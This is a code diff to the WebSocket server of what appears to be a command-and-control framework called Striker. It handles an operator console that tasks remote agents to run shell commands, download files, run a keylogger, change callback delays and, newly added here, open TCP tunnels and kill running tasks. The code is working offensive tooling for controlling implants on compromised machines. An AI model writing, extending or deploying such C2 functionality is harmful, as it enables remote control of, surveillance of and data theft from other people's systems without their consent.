@@ -1,5 +1,6 @@
 /**
  * @file The server side Web Sockets (WS) implementation.
+ *       This file also handles logic of agents console.
  * @author Umar Abdul
  */
 
@@ -70,51 +71,45 @@ export const setupWS = (httpServer) => {
     output(`WS: New connection for '${username}': ${client.id}`);
 
     // Console help page.
-    const helpPage = "  COMMAND                FUNCTION\n"+
-                     "  -------                --------\n\n"+
-                     "  abort                  Task agent to quit\n"+
-                     "  clear                  Clear console output\n"+
-                     "  cd <dir>               Change working directory\n"+
-                     "  delay <secs>           Update agent callback delay\n"+
-                     "  delete agent           Delete agent\n"+
-                     "  delete task <id>       Delete a task\n"+
-                     "  download <file>        Download a file from the agent\n"+
-                     "  freeze                 Freeze/stop agent from receiving tasks\n"+
-                     "  help/?                 You are looking at it :p\n"+
-                     "  unfreeze               Unfreeze agent\n"+
-                     "  keymon <secs>          Run a keylogger for given amount of seconds\n"+
-                     "  system <cmd>           Run a shell command on the agent\n"+
-                     "  writedir <dir>         Change the write directory of an agent\n";
+    const helpPage = "  COMMAND                               FUNCTION\n"+
+                     "  -------                               --------\n\n"+
+                     "  abort                                 Task agent to quit\n"+
+                     "  clear                                 Clear console output\n"+
+                     "  cd <dir>                              Change working directory\n"+
+                     "  delay <secs>                          Update agent callback delay\n"+
+                     "  delete agent                          Delete agent\n"+
+                     "  delete task <id>                      Delete a task\n"+
+                     "  download <file>                       Download a file from the agent\n"+
+                     "  freeze                                Freeze/stop agent from receiving tasks\n"+
+                     "  help/?                                You are looking at it :p\n"+
+                     "  kill <id>                             Task agent to kill a running task\n"+
+                     "  tasks                                 List running tasks\n"+
+                     "  tunnel <lhost:lport> <rhost:rport>    Start a TCP tunnel\n"+
+                     "  unfreeze                              Unfreeze agent\n"+
+                     "  keymon <secs>                         Run a keylogger\n"+
+                     "  system <cmd>                          Run a shell command on the agent\n"+
+                     "  writedir <dir>                        Change the write directory of an agent\n";
 
     /**
      * For processing raw agent console inputs from users. 
      * Note that some inputs are handled completely in the client side.
      * Both input and results are broadcasted to all connected users.
      */
-    client.on("agent_console_input", (data) => {
+    client.on("agent_console_input", async (data) => {
 
       try{
-        const agent = data.agent;
-        const agentID = agent.uid.toString();
+        const agentID = data.agentID.toString();
         const input = data.input.toString().trim();
         client.emit("agent_console_output", {
-          agentID,
-          msg: `${username} > ${input}`
+          agentID, msg: `${username} > ${input}`
         });
         if (input === "help" || input === "?"){
           client.emit("agent_console_output", {
-            agentID,
-            msg: helpPage
+            agentID, msg: helpPage
           });
         }else if (input.startsWith("system ")){ // Create a system command task
           let cmd = input.substr(7).trim();
-          const taskData = {
-            agentID,
-            taskType: "system",
-            data: {
-              cmd
-            }
-          };
+          const taskData = {agentID, taskType: "system", data: {cmd}};
           taskModel.createTask(username, taskData).catch(error => {
             client.emit("striker_error", error.message);
           });
@@ -189,6 +184,46 @@ export const setupWS = (httpServer) => {
           }, onComplete).catch(error => {
             client.emit("striker_error", error.message);
           });
+        }else if (input.startsWith("tunnel ")){
+          let addrs = input.substr(7).trim();
+          let lhost = addrs.split(":")[0].trim()
+          let lport = parseInt(addrs.split(":")[1].trim().split(" ")[0].trim());
+          let rhost = addrs.split(" ")[1].trim().split(":")[0].trim();
+          let rport = parseInt(addrs.split(":")[2].trim())
+          if (isNaN(lport) || isNaN(rport))
+            return client.emit("agent_console_output", {agentID, msg: "Invalid port!"});
+          if (!(lhost && rhost))
+            return client.emit("agent_console_output", {agentID, msg: "Invalid host!"});
+          taskModel.createTask(username, {
+            agentID, taskType: "tunnel", data: {lhost, lport, rhost, rport}
+          }).catch(error => {
+            client.emit("striker_error", error.message);
+          });
+        }else if (input === "tasks"){
+          let tasks = await taskModel.getTasks(agentID);
+          let running = [];
+          for (let task of tasks){
+            if (task.received === true && task.completed === false)
+              running.push(task);
+          }
+          let msg = "No running tasks at the moment!";
+          if (running.length > 0){
+            msg = "";
+            for (let task of running)
+              msg += ` > ${task.uid} - ${task.taskType}\n`;
+          }
+          return client.emit("agent_console_output", {agentID, msg});
+        }else if (input.startsWith("kill ")){
+          const task = await Task.findOne({uid: input.substr(5).trim()});
+          if (!task)
+            return client.emit("agent_console_output", {agentID, msg: "Invalid task!"});
+          if (!(task.completed === false && task.received === true))
+            return client.emit("agent_console_output", {agentID, msg: "Task already completed, or not yet received by agent!"});
+          taskModel.createTask(username, {
+            agentID, taskType: "kill", data: {uid: task.uid}
+          }).catch(error => {
+            client.emit("striker_error", error.message);
+          });
         }else if (input === "abort"){
           taskModel.createTask(username, {
             agentID, taskType: "abort"
@@ -202,7 +237,6 @@ export const setupWS = (httpServer) => {
           });
         }
       }catch(error){
-        console.log(error);
         client.emit("striker_error", error.message);
       }
     });
@@ -210,14 +244,6 @@ export const setupWS = (httpServer) => {
     // For queuing a prepared task for an agent.
     client.on("create_task", (data) => {
        taskModel.createTask(username, data).catch(error => {
-        client.emit("striker_error", error.message);
-      });
-    });
-
-    // For deleting a task.
-    client.on("delete_task", (data) => {
-
-      taskModel.deleteTask(data.agentID, data.taskID, username).catch(error => {
         client.emit("striker_error", error.message);
       });
     });
